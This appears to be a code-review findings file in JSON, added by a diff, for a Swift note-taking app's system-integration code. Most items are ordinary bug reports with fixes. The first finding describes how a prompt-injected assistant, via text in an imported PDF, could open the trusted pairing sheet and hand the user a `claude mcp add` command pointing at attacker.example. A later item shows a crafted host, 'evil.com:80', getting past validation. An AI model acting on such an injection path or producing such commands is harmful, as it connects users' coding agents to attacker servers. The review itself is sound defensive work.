@@ -1,0 +1,59 @@
+{
+  "verdict": "needs-fix",
+  "issues": [
+    {
+      "severity": "major",
+      "where": "NibKit/Sources/FeatSystemIntegration/DeepLinkRouter.swift:490-499 (bridgePair route), 546-559 (showPairing), 317-327 (BridgePairing(params:)), 609-616 (BridgePairingSheet.panel)",
+      "problem": "The route only lets the user open a pairing sheet ('only the person opens one ... never an agent or a plugin'), but the check can be skipped. The sheet is a registered .sheet panel that builds its pairing from plain panel.open params (host, port, token). Any principal that may call panel.open, and the AI and the bridge hold every scope except security (Gateway.defaultGrants), can run panel.open {id: \"system.bridgePairing\", host: \"attacker.example\", token: \"x\"} and get the same trusted 'Pair an Agent' sheet. Its Copy Command and Share Command give the user a `claude mcp add ... http://attacker.example:7331/mcp` line to paste on their computer. For example, a prompt-injected assistant (text in an imported PDF) could get the user to connect their coding agent to an attacker's MCP server. The live bridge token also travels through nested panel.open params.",
+      "fix": "Stop the panel from reading host and token out of panel.open params. In showPairing, store the parsed BridgePairing in SystemRuntime (e.g. `var pendingPairings: [String: BridgePairing]`) under a fresh nonce (NibID.make().raw), and call panel.open {id, pairing: <nonce>} only. In BridgePairingSheet.panel, look the nonce up through SystemRuntime.shared(ctx.app.services). Keep the entry until the sheet is dismissed or for 10 minutes, and do not consume it on the first makeView. Show the existing 'incomplete' empty state for anything else. Delete BridgePairing.init?(params:), or keep it test-only. Add tests: panel.open as .ai with raw host and token gives a nil pairing, and the nonce written by the user route resolves."
+    },
+    {
+      "severity": "major",
+      "where": "NibKit/Sources/FeatSystemIntegration/SystemCommands.swift:216-222 (IntentActions.appendText)",
+      "problem": "Append Text to Note checks `app.isReadOnly(doc)` before `app.workspace.content(doc)` loads the document. NibStore sets its read-only gate inside loadHead (feat/F001 PackagePersistence.swift:185-186: format > NibFormat.version). So for a document saved by a newer Nib on another device and not yet in memory, the check returns false. The load then sets the gate, and text.createBox / block.insert commit in memory only: F026 does not check isReadOnly, and PackagePersistence.didChange logs 'not saving' and returns. Siri replies 'Added to <title>.' but the text is never saved.",
+      "fix": "Move the read-only check after the load: `let content = try app.workspace.content(doc)` first, then `if app.isReadOnly(doc) { throw NibError(.unsupported, ...) }`. Add a test with a DocumentPersistence stub whose isReadOnly(doc) becomes true only inside loadHead (the document not yet loaded). It must expect .unsupported and no text.createBox or block.insert calls."
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Sources/FeatSystemIntegration/DeepLinkRouter.swift:292-299, 330 (BridgePairing.init host validation, urlHost)",
+      "problem": "Host validation takes any string without whitespace, '/', '@', '?' or '#'. 'evil.com:80' passes, and because it contains ':' urlHost treats it as IPv6, giving 'http://[evil.com:80]:7331/mcp'. Public internet hosts also pass without comment, although the bridge only serves LAN and Tailscale clients (ARCHITECTURE §12).",
+      "fix": "When the host contains ':', require a valid IPv6 literal (Network's IPv6Address(bare) != nil, or inet_pton) and reject it otherwise. Add `var isPrivateNetwork: Bool`, true for RFC 1918, 100.64.0.0/10, link-local, fd00::/8 (Tailscale fd7a:115c:a1e0::/48), *.ts.net, *.local and single-label names. When it is false, show a warning footer in the sheet: 'This address isn't on your local network or Tailscale. Only pair with a bridge you set up.'"
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Sources/FeatSystemIntegration/SystemCommands.swift:220-245 (IntentActions.appendText)",
+      "problem": "AppendTextIntent runs in the background (no openAppWhenRun), yet it neither flushes the document after the edit nor unloads a document it loaded only for the intent. The write depends on NibStore's 1.5 s debounce, with the WAL on the async io queue, while iOS may suspend the process right after perform() returns. Each Siri append also leaves the head and last page resident.",
+      "fix": "Record `let wasLoaded = app.workspace.isLoaded(doc)` before loading. After the commands, call `app.workspace.persistence.flush(doc)`, then `if !wasLoaded { app.workspace.close(doc) }` (close also flushes)."
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Sources/FeatSystemIntegration/DeepLinkRouter.swift:409-414, 528-542 (open route / requireDocument)",
+      "problem": "An open link is checked only for its document. A link to a page that was since deleted (links outlive their targets, like Copy Link to Page or text links) passes the page on to doc.open and fails, instead of landing in the document. The comment thread is dropped along with it.",
+      "fix": "In the .open case, when a page is given, read `ctx.workspace.peekContent(doc).page(p)`. If it is missing or deleted, open the document without the page and skip comment.tapAt (log it). Add a router test with a deleted page."
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Sources/FeatSystemIntegration/DeepLinkRouter.swift:574-593 (AlertLinkConfirmer)",
+      "problem": "The checked continuation resumes only from the two alert actions. If navigator.presentModal does not present the alert (for example, the topmost controller is being dismissed, or the scene disconnects), the app.openURL task waits forever with no answer.",
+      "fix": "After presentModal, on the next main-queue turn check `alert.presentingViewController != nil`. If it is nil, resume with false, guarding against a double resume with a local flag. Alternatively, route the question through `ctx.app?.gateway.presenter` (the shell's alert presenter) with a ConfirmationRequest for plugin.install."
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Sources/FeatSystemIntegration/QuickActions.swift:103-110, 246-260 (FavouritesFile.Entry.modified / refresh)",
+      "problem": "Entry includes `modified`, so every save of a favourite document (each library.changed after a 1.5 s pause while writing) rewrites favourites.json and calls WidgetCenter.reloadAllTimelines(). That is steady file I/O and widget reloads during normal note-taking, although the widget only needs the set, order and titles.",
+      "fix": "Compare entries without `modified` (e.g. compare [id, title, kind, folder, url] tuples) to decide whether to write. Or write favourites.json only on start, on didEnterBackground and when the favourite set or titles change, and write `modified` without comparing it."
+    },
+    {
+      "severity": "minor",
+      "where": "Nib/Intents/NibAppIntents.swift:302-330 (NibAppShortcuts)",
+      "problem": "The comment says the literal symbol names match NibSymbol tokens. Two do not: 'folder.badge.plus' (Create Folder) and 'text.append' (Append Text) are not in NibSymbol (.folder is 'folder', .textDocument is 'doc.text'). These are SF Symbol strings outside the token set (DESIGN.md §15.1), and the lint regex does not catch systemImageName:.",
+      "fix": "Use 'folder' and 'doc.text' (the literal names of NibSymbol.folder and .textDocument), or file docs/contract-requests/F074-symbols.md for newFolder and appendText tokens and keep the literals until they exist. Correct the comment either way."
+    },
+    {
+      "severity": "minor",
+      "where": "NibKit/Sources/FeatSystemIntegration/DeepLinkRouter.swift:601-734 (BridgePairingSheet); NibKit/Tests/FeatSystemIntegrationTests",
+      "problem": "The pairing sheet is a new screen, and DESIGN.md §15.7 asks for its Light, Dark and AX3 snapshots (NibSnapshot, contracts-v2 G20). No test renders it or checks its layout at AX3. The masked token row also reads the bullet characters aloud under VoiceOver.",
+      "fix": "Add a test that renders BridgePairingSheet (complete and incomplete) with NibSnapshot.images and asserts NibSnapshot.fittingSize at width 375 in .largeText stays finite and non-zero. On the token NibRow, add `.accessibilityValue(revealed ? pairing.token : String(localized: \"Hidden\"))`."
+    }
+  ]
+}
